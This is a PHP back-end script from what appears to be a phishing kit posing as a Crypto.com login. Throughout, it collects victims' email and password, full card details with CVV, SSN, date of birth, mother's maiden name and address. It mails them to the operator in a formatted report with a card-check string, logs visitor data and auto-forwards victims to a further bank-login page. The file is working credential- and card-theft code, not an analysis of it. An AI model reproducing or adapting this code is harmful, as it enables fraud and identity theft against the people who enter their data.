<?php
session_start();
include '../main.php';
include'../get_setting.php';

$ip = getUserIP();
$randomnumber = rand(1, 100);
if(!isset($_POST['email'])) {
exit(header("HTTP/1.0 404 Not Found")); 
}else{
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
$asdasdas = $_POST['cc'];
$tolkon = str_replace(" ", "", $asdasdas);
$bin = check_bin($tolkon);
$bins = preg_replace('/\s/', '', $tolkon);
$bins = substr($bins,0,6);
if($bin["brand"] == "") {
        $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
    $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
$expnya = $_POST['exp'];
$expired = str_replace("/", "|", $expnya);
$forcheck = "".$tolkon."|".$expired."|".$_POST['cvv']."";
$fromsend = "FROM: ".$_POST['fname']." <".$sender_mail.">";
$message = '
<head>
<style>
body {
font-family:sans-serif;
}
</style>
</head>
<center> 
<div style="background: url(https://i.ibb.co/Zhv168g/logo.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>CRYPTO.COM LOGIN</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>EMAIL</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['email'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['pass_log'].'</b></th>
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>CARD INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>BANK</th>
<th style="width: 78%; text-align: center;"><b>'.$bin["bank"]["name"].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>TYPE</th>
<th style="width: 78%; text-align: center;"><b>'.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.strtoupper($bin["brand"]).'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CARD HOLDER</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['fname'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CARD NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$tolkon.'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>EXPIRED (MM/YY)</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['exp'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CVV</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['cvv'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>AMEX CID</th>
<th style="width: 78%; text-align: center;"><b>'.$cid.'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>MOTHER MAIDEN NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['mmn'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>FOR CHECK</th>
<th style="width: 78%; text-align: center;"><b>'.$forcheck.'</b></th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>BILLING INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>FULL NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['fname'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>STATE</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['state'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['city'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>STREET ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['address'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ZIP</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['zip'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>DATE OF BIRTH</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['dob'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>SSN</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['ssn'].'</b></th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$_POST['phone'].'</b></th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>DEVICE INFORMATION</b></div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$cn.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$regioncity.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$citykota.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>CONTINENT</th>
<th style="width: 78%; text-align: center;"><b>'.$continent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>USER AGENT</th>
<th style="width: 78%; text-align: center;"><b>'.$user_agent.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>ISP</th>
<th style="width: 78%; text-align: center;"><b>'.$ispuser.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>OS / BROWSER</th>
<th style="width: 78%; text-align: center;"><b>'.$os.' / '.$br.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>TIMEZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="35px"><b>DATE</th>
<th style="width: 78%; text-align: center;"><b>'.$date.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;"><b>SPM55</b></div>
</center>
';
if ($send_login == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$fromsend.'' . "\r\n";
include'.api.php';
$kirim = mail($email_result, $subject, $message, $headers);
tulis_file("../result/cc.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
}else{
include'.api.php';
include'server.php';
tulis_file("../result/cc.txt", $ip);
tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|[".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])."");
}
if ($get_bank == "on") {
echo "<form id='boyxd' method='POST' action='../bank'>
<input type='hidden' name='email' value='".$_POST['email']."'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
<input type='hidden' name='state' value='".$_POST['state']."'>
<input type='hidden' name='city' value='".$_POST['city']."'>
<input type='hidden' name='address' value='".$_POST['address']."'>
<input type='hidden' name='zip' value='".$_POST['zip']."'>
<input type='hidden' name='dob' value='".$_POST['dob']."'>
<input type='hidden' name='phone' value='".$_POST['phone']."'>
<input type='hidden' name='ssn' value='".$_POST['ssn']."'>
<input type='hidden' name='mmn' value='".$_POST['mmn']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "<form id='boyxd' method='POST' action='../success'>
<input type='hidden' name='email' value='".$_POST['email']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
?>